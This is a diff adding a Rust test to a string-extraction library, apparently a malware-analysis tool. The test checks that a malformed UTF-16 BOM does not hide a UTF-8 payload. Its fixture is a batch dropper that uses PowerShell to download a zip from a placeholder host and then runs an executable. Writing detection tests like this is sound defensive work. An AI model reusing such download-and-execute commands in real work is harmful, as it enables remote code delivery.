@@ -421,6 +421,25 @@ fn test_utf16be_bom_detection() {
 }
 
 #[test]
+fn malformed_utf16_bom_with_utf8_payload_is_scanned_as_text() {
+    let data = b"\xFF\xFE@echo off\r\npowershell -command \"Invoke-WebRequest https://example.invalid/Ta.zip -o Ta.zip\"\r\nstart Ta.exe\r\n";
+
+    let strings = stng::extract_strings_with_options(data, &stng::ExtractOptions::new(4));
+
+    let command = strings
+        .iter()
+        .find(|s| s.value.contains("Invoke-WebRequest"))
+        .expect("malformed BOM wrapper must not hide its UTF-8 payload");
+    assert_eq!(
+        command.data_offset as usize,
+        data.windows(b"powershell".len())
+            .position(|window| window == b"powershell")
+            .expect("fixture contains the recovered command")
+    );
+    assert_ne!(command.method, StringMethod::Utf16LeDecode);
+}
+
+#[test]
 fn test_dissect_vs_bare_options() {
     let path = "/Users/t/data/dissect/malware/typescript/2026.property-demo/webfonts/fa-brands-regular.woff2";
     let Ok(data) = std::fs::read(path) else {
